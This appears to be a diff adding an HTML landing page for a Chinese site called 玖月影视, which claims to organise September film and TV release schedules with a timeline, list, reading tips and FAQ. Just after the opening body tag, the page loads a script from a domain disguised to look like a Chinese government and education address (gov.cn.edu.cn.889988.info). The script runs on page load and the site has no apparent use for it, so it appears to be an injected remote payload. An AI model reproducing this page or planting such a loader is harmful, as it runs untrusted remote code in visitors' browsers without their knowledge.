@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>玖月影视 · 九月档期影视作品与话题观察 · jiuyueyingshi-top.github.io</title>
+<meta name="description" content="玖月影视聚焦每年九月前后的影视作品与行业话题，整理九月新作、开学季题材、秋日观影氛围与档期排布，以时间线方式呈现作品从立项到播出的过程。">
+<meta name="keywords" content="玖月影视,九月档期影视,秋季影视作品,开学季影视题材,九月新剧上映,秋日观影,影视档期观察,九月话题盘点">
+<style>
+:root{--purple:#4a3f7a;--violet:#6b5ca5;--lilac:#e9e5f5;--plum:#8a6fb8;--ink:#211e33;--gray:#5b5870;--paper:#faf9fc;--line:#e4e0ef;--gold:#c79a3f;--cream:#fffdf9}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"PingFang SC","Microsoft YaHei",sans-serif;color:var(--ink);line-height:1.85;font-size:15px;background:var(--paper)}
+.wrap{max-width:1120px;margin:0 auto;padding:0 26px}
+/* top line */
+.line{background:var(--purple);color:var(--lilac);font-size:12px;padding:8px 0}
+.line .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.line b{color:#fff;font-weight:600}
+.line a{color:#cfc7ea}
+/* nav */
+nav{background:#fff;border-bottom:3px solid var(--purple);position:sticky;top:0;z-index:99;box-shadow:0 2px 10px rgba(74,63,122,.06)}
+nav .wrap{display:flex;align-items:center;height:60px;gap:2px;flex-wrap:wrap}
+.brand{font-size:20px;font-weight:800;letter-spacing:1px;color:var(--purple);margin-right:16px}
+.brand em{font-style:normal;background:var(--purple);color:#fff;padding:2px 7px;border-radius:4px;font-size:15px;margin-right:6px}
+nav a{font-size:13px;color:var(--gray);padding:7px 11px;border-radius:20px}
+nav a:hover{background:var(--lilac);color:var(--purple)}
+/* hero */
+.hero{background:linear-gradient(135deg,#3d3466 0%,#6b5ca5 52%,#a48ec9 100%);color:#fff;padding:60px 0 66px;position:relative;overflow:hidden}
+.hero:before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(135deg,transparent 0 22px,rgba(255,255,255,.035) 22px 23px)}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:center}
+.hero h1{font-size:42px;line-height:1.3;letter-spacing:2px}
+.hero h1 u{text-decoration:none;color:#ffe6b8}
+.hero p{margin-top:16px;color:#e6e0f5;font-size:15.5px;max-width:520px}
+.hero .acts{margin-top:22px;display:flex;gap:10px;flex-wrap:wrap}
+.a1{display:inline-block;padding:10px 24px;background:#fff;color:var(--purple);border-radius:22px;font-size:13.5px;font-weight:700}
+.a2{display:inline-block;padding:10px 24px;border:1px solid rgba(255,255,255,.55);color:#fff;border-radius:22px;font-size:13.5px}
+.mono{border-left:4px solid #ffe6b8;padding:18px 20px;background:rgba(255,255,255,.12);border-radius:0 8px 8px 0}
+.mono h3{font-size:14px;letter-spacing:3px;color:#ffe6b8;margin-bottom:10px}
+.mono p{font-size:13px;color:#efeaf8;line-height:2;margin:0}
+/* sections */
+section{padding:52px 0}
+h2{font-size:24px;color:var(--purple);display:flex;align-items:center;gap:10px;margin-bottom:4px}
+h2 i{font-style:normal;background:var(--lilac);color:var(--purple);width:30px;height:30px;border-radius:8px;display:inline-flex;align-items:center;justify-content:center;font-size:15px}
+h2 small{font-size:11px;letter-spacing:3px;color:var(--plum);font-weight:400}
+.lead{color:var(--gray);font-size:13.5px;margin:10px 0 24px;padding-left:40px}
+/* cards 4 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.c4{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:#fff}
+.c4 .hd{background:var(--purple);color:#fff;padding:13px 16px;font-size:15px;letter-spacing:1px}
+.c4 ul{list-style:none;padding:14px 16px}
+.c4 li{font-size:13px;color:var(--gray);padding:5px 0 5px 14px;position:relative;line-height:1.6}
+.c4 li:before{content:"";position:absolute;left:0;top:12px;width:5px;height:5px;border-radius:50%;background:var(--plum)}
+/* timeline */
+.tl{position:relative;padding-left:34px}
+.tl:before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:var(--lilac)}
+.node{position:relative;margin-bottom:20px;background:#fff;border:1px solid var(--line);border-radius:10px;padding:16px 20px}
+.node:before{content:"";position:absolute;left:-29px;top:20px;width:12px;height:12px;border-radius:50%;background:var(--plum);border:3px solid var(--lilac)}
+.node .d{font-size:12px;color:var(--gold);letter-spacing:1px;font-weight:700}
+.node h4{font-size:16px;color:var(--purple);margin:3px 0 7px}
+.node p{font-size:13.5px;color:#4c4963;line-height:1.8}
+/* table */
+.tw{overflow-x:auto;border:1px solid var(--line);border-radius:10px;background:#fff}
+table{width:100%;border-collapse:collapse;min-width:780px;font-size:13.5px}
+caption{caption-side:top;text-align:left;padding:14px 20px;background:var(--purple);color:#fff;font-size:13.5px;letter-spacing:2px}
+th,td{padding:11px 18px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--lilac);color:var(--purple);white-space:nowrap;font-weight:700}
+tbody tr:nth-child(even){background:var(--paper)}
+.tag{display:inline-block;padding:1px 10px;border-radius:11px;background:var(--lilac);color:var(--purple);font-size:12px}
+/* steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0}
+.st{position:relative;padding:20px 18px 20px 44px;border-right:1px dashed var(--line)}
+.st:last-child{border-right:none}
+.st b{position:absolute;left:12px;top:16px;font:700 22px Georgia,serif;color:var(--lilac)}
+.st h4{font-size:15px;color:var(--purple);margin-bottom:7px}
+.st p{font-size:13px;color:var(--gray);line-height:1.75}
+/* stats */
+.nums{background:var(--purple);color:var(--lilac);padding:32px;border-radius:10px;display:grid;grid-template-columns:repeat(4,1fr);gap:14px;text-align:center}
+.nums b{display:block;font-size:30px;color:#fff;font-family:Georgia,serif}
+.nums i{font-style:normal;font-size:12px;letter-spacing:1px}
+/* faq */
+.faq{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.fq{background:#fff;border:1px solid var(--line);border-radius:10px;padding:16px 20px}
+.fq h4{font-size:14px;color:var(--purple);margin-bottom:6px}
+.fq p{font-size:13px;color:var(--gray);line-height:1.8}
+/* about */
+.ab{border:1px solid var(--line);border-radius:12px;padding:30px 34px;background:linear-gradient(180deg,#fff,var(--paper));position:relative}
+.ab:after{content:"09";position:absolute;right:26px;top:16px;font:700 46px Georgia,serif;color:var(--lilac)}
+.ab p{margin-bottom:12px;font-size:14.5px;color:#3d3a52;position:relative;z-index:2}
+.url{margin-top:16px;padding:13px 18px;background:var(--cream);border:1px dashed var(--plum);border-radius:8px;font-size:13px;word-break:break-all;color:#4c4963}
+/* footer */
+footer{background:var(--ink);color:#9893b0;padding:40px 0 20px;margin-top:36px}
+.fg{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;margin-bottom:26px}
+.fg h4{color:#fff;font-size:13.5px;letter-spacing:2px;margin-bottom:12px}
+.fg a{display:block;color:#8d89a5;font-size:12.5px;padding:3px 0}
+.fg a:hover{color:#fff}
+.copy{border-top:1px solid #3a3652;padding-top:16px;font-size:12.5px;text-align:center;color:#817c99}
+.copy b{color:var(--gold)}
+@media(max-width:900px){.hero .wrap{grid-template-columns:1fr}.grid4,.steps,.faq,.fg,.nums{grid-template-columns:repeat(2,1fr)}.st{border-bottom:1px dashed var(--line)}.hero h1{font-size:32px}}
+@media(max-width:600px){.wrap{padding:0 16px}.grid4,.steps,.faq,.fg,.nums{grid-template-columns:1fr}.hero h1{font-size:26px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="line"><div class="wrap"><span><b>玖月影视</b> · 九月档期影视作品与话题观察</span><span>本站地址 <a href="#">jiuyueyingshi-top.github.io</a></span></div></div>
+<nav><div class="wrap"><span class="brand"><em>玖</em>玖月影视</span><a href="#focus">九个观察方向</a><a href="#line">九月时间线</a><a href="#list">作品清单</a><a href="#how">查阅方法</a><a href="#faq">常见疑问</a><a href="#about">关于本站</a></div></nav>
+<header class="hero"><div class="wrap"><div><h1>九月前后的<br><u>影视作品</u>与话题</h1><p>玖月影视不做推荐排名，只按时间线整理每年九月前后值得留意的新作、开学季题材作品与秋日观影氛围，记录它们从消息公布到正式播出的过程。</p><div class="acts"><a class="a1" href="#line">查看九月时间线</a><a class="a2" href="#list">打开作品清单</a></div></div><aside class="mono"><h3>本页四部分</h3><p>九个观察方向<br>九月时间线<br>作品清单<br>查阅方法</p></aside></div></header>
+<section id="focus"><div class="wrap"><h2><i>壹</i>九个观察方向 <small>NINE ANGLES</small></h2><p class="lead">方向比作品更先确定。先想清楚关心哪一类，再往下翻清单，效率会高很多。</p><div class="grid4"><div class="c4"><div class="hd">按题材看</div><ul><li>校园与开学季</li><li>职场新人成长</li><li>都市情感</li><li>悬疑犯罪</li><li>历史与年代</li></ul></div><div class="c4"><div class="hd">按形式看</div><ul><li>长篇连续剧</li><li>院线电影</li><li>纪实影像</li><li>短篇单元</li><li>综艺特别企划</li></ul></div><div class="c4"><div class="hd">按节奏看</div><ul><li>一口气追完型</li><li>每周更新型</li><li>单集独立型</li><li>需要暂停思考型</li><li>背景音陪伴型</li></ul></div><div class="c4"><div class="hd">按心情看</div><ul><li>想被安慰</li><li>想被触动</li><li>想动脑筋</li><li>想放空</li><li>想与人讨论</li></ul></div></div></div></section>
+<section id="line" style="background:var(--lilac)"><div class="wrap"><h2><i>贰</i>九月时间线 <small>TIMELINE</small></h2><p class="lead">以九月为锚点，往前回溯暑期尾巴，往后延伸到国庆档前，这一段时间的作品密度往往最高。</p><div class="tl"><div class="node"><div class="d">08.20 — 08.31</div><h4>暑期档收尾</h4><p>这一阶段以补档和口碑发酵为主，适合回头看七月八月没能顾上的作品，也常有一些延期后突然定档的消息。</p></div><div class="node"><div class="d">09.01 — 09.10</div><h4>开学季题材集中出现</h4><p>校园、青春、成长类作品在这几天扎堆，同时也有一批面向职场新人的现实题材开始预热。</p></div><div class="node"><div class="d">09.11 — 09.20</div><h4>中期口碑分化</h4><p>开播两周左右，评价开始分层。这一阶段最适合做取舍，不必每部都追。</p></div><div class="node"><div class="d">09.21 — 09.30</div><h4>国庆档前的最后一周</h4><p>院线方面进入定档密集期，剧集则开始出现十月排播消息，是整理清单的好时机。</p></div></div></div></section>
+<section id="list"><div class="wrap"><h2><i>叁</i>作品清单 <small>LIST</small></h2><p class="lead">以下为玖月影视按九月档期整理的清单条目，仅标注题材、形式与适合人群，不涉及播放与下载。</p><div class="tw"><table><caption>玖月影视 · 九月档期作品清单（共 8 条）</caption><thead><tr><th>时间窗口</th><th>题材方向</th><th>作品形式</th><th>适合人群</th></tr></thead><tbody><tr><td>八月底</td><td>暑期档补看</td><td>长篇连续剧</td><td><span class="tag">追剧型</span></td></tr><tr><td>九月初</td><td>校园与开学季</td><td>连续剧 / 电影</td><td><span class="tag">学生与家长</span></td></tr><tr><td>九月初</td><td>职场新人</td><td>现实题材剧</td><td><span class="tag">职场人群</span></td></tr><tr><td>九月中</td><td>悬疑犯罪</td><td>短篇单元</td><td><span class="tag">动脑型</span></td></tr><tr><td>九月中</td><td>都市情感</td><td>长篇连续剧</td><td><span class="tag">陪伴观看</span></td></tr><tr><td>九月下</td><td>历史与年代</td><td>院线电影</td><td><span class="tag">周末观影</span></td></tr><tr><td>九月下</td><td>纪实影像</td><td>纪录片</td><td><span class="tag">深度观看</span></td></tr><tr><td>国庆前一周</td><td>综艺特别企划</td><td>综艺节目</td><td><span class="tag">轻松消遣</span></td></tr></tbody></table></div></div></section>
+<section id="how" style="background:var(--lilac)"><div class="wrap"><h2><i>肆</i>四种查阅方法 <small>METHOD</small></h2><p class="lead">清单很长但时间有限，玖月影视给出四种进入方式，按自己的状态挑一种即可。</p><div class="steps"><div class="st"><b>1</b><h4>按时间倒着看</h4><p>从最近更新的条目往回翻，先抓当下正在发生的，再决定是否补前面的。</p></div><div class="st"><b>2</b><h4>按题材挑一类</h4><p>一次只看一个题材，避免被清单长度劝退，也更容易形成自己的判断。</p></div><div class="st"><b>3</b><h4>按节奏选时长</h4><p>时间少就看短篇单元，时间充裕再看长篇连续剧，匹配不上最容易半途而废。</p></div><div class="st"><b>4</b><h4>按口碑做减法</h4><p>中期分化之后只留两三部继续追，其余标记为待定，不必强迫自己看完。</p></div></div></div></section>
+<section id="nums"><div class="wrap"><div class="nums"><div><b>9</b><i>个观察方向</i></div><div><b>8</b><i>条作品清单</i></div><div><b>4</b><i>段时间线</i></div><div><b>4</b><i>种查阅方法</i></div></div></div></section>
+<section id="faq"><div class="wrap"><h2><i>伍</i>常见疑问 <small>FAQ</small></h2><p class="lead">关于玖月影视的几个常见问题。</p><div class="faq"><div class="fq"><h4>玖月影视提供播放或下载吗？</h4><p>不提供。本站只做作品信息与档期观察，不涉及任何资源链接。</p></div><div class="fq"><h4>为什么只关注九月前后？</h4><p>因为八月底到九月末这一段，新作定档、开学季题材、国庆档预热三者叠加，信息密度最高，值得单独整理。</p></div><div class="fq"><h4>清单多久更新一次？</h4><p>按时间线节点更新：八月底、九月初、九月中、九月下各整理一次，国庆前再做一次收尾。</p></div><div class="fq"><h4>作品信息从哪里来？</h4><p>来自公开的新闻稿、官方定档公告与播出平台信息，本站只做归纳，不自行添加内容。</p></div><div class="fq"><h4>清单会打评分吗？</h4><p>不会。玖月影视只标注题材、形式与适合人群，评价交给观看者自己。</p></div><div class="fq"><h4>可以转载这些整理吗？</h4><p>可以，保留出处即可。玖月影视的全部整理均首发于本站。</p></div></div></div></section>
+<section id="about"><div class="wrap"><div class="ab"><h2><i>陆</i>关于玖月影视</h2><p>玖月影视是一个围绕九月前后影视档期做整理的小站，它关心的是作品在什么时间出现、属于什么题材、适合什么人看，而不是谁排第一。</p><p>这里的清单不评分、不排名、不打标签好坏，只做信息归纳与时间线梳理。同样一部作品，在九月看和在其他月份看，所处的讨论环境完全不同，这也是单独整理这一段的意义。</p><p>如果你也在关注九月档期，欢迎把这里当成一个可以随时翻的笔记。清单会随档期推进持续补充，分类方式也可能调整。</p><div class="url">玖月影视 · 本站访问地址：https://jiuyueyingshi-top.github.io</div></div></div></section>
+<footer><div class="wrap"><div class="fg"><div><h4>玖月影视</h4><a href="#">整理说明</a><a href="#">分类方式</a><a href="#">更新节奏</a></div><div><h4>翻阅入口</h4><a href="#focus">九个观察方向</a><a href="#line">九月时间线</a><a href="#list">作品清单</a></div><div><h4>查阅方法</h4><a href="#how">按时间</a><a href="#how">按题材</a><a href="#how">按节奏</a><a href="#how">按口碑</a></div><div><h4>其他</h4><a href="#faq">常见疑问</a><a href="#about">关于本站</a><a href="#">转载说明</a></div></div><p class="copy">© 玖月影视 · 九月档期影视作品与话题观察　｜　本站地址：<b>https://jiuyueyingshi-top.github.io</b></p></div></footer>
+</body>
+</html>
